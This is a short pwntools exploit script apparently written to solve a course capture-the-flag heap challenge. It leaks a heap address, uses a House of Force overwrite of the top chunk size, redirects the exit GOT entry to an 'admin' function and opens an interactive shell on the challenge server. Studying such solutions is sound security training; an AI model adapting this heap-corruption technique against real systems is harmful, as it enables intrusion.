#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
)

def start(binary):

    gs = '''
        init-pwndbg
        b *0x400b14
        b *0x400b79
        b *0x400b53
        b *0x400b64
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-force-1.chals.io", 443, ssl=True, sni="cse4850-force-1.chals.io")
    else:
        return process(binary)

def delta(x, y):
    return (0xffffffffffffffff - x) + y

def exploit(p,e,r):
    
    p.recvuntil(b"at ")
    heap_leak = int(p.recvline(), 16)

    force = b"A" * 0x88 + p64(0xfffffffffffffff1)
    # Here to wrap around we need to include the distance from our leak to our first input
    # which is 0x260, then we needed to include the 0x90 sized chunk which is from the first malloc
    # then we have to include the 0x10 to account for the heap metadata

    distance = delta(heap_leak, e.got["exit"]) - 0x90 - 0x10 - 0x260

    log.info(f"Leaked heap address {hex(heap_leak)}")
    log.info(f"Distance from heap to exit got {distance}")
    win = p64(e.sym["admin"])

    p.sendline(force)
    p.sendline(bytes(str(distance), encoding="ascii"))
    p.sendline(win)
    p.interactive()

if __name__=="__main__":
    file = './chal.bin'

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
